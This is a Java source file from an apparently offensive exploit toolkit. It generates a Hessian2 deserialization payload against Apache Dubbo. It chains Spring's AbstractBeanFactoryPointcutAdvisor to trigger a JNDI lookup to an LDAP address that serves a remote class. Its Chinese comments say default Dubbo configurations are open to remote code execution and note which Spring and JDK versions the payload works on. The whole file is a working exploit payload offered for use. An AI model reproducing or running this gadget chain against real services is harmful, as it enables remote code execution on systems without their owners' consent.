package com.threedr3am.exp.dubbo.payload.hessian;

import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.SpringUtil;
import org.springframework.beans.factory.BeanFactory;

/**
 * dubbo 默认配置，即hessian2反序列化，都可RCE
 *
 * Spring环境可打，暂时测试Spring-boot打不了（应该是AOP相关类的问题）
 *
 * <dependency>
 *   <groupId>org.springframework</groupId>
 *   <artifactId>spring-aop</artifactId>
 *   <version>${spring.version}</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class SpringAbstractBeanFactoryPointcutAdvisorPoc implements Payload {

  /**
   *
   * @param args
   *
   * arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）
   *
   * @return
   */
  @Override
  public Object getPayload(String[] args) {
    Object o = null;
    try {
      BeanFactory bf = SpringUtil.makeJNDITrigger("ldap://127.0.0.1:43658/Calc");
      o = SpringUtil.makeBeanFactoryTriggerBFPA("ldap://127.0.0.1:43658/Calc", bf);
    } catch (Exception e) {
      e.printStackTrace();
    }
    return o;
  }
}
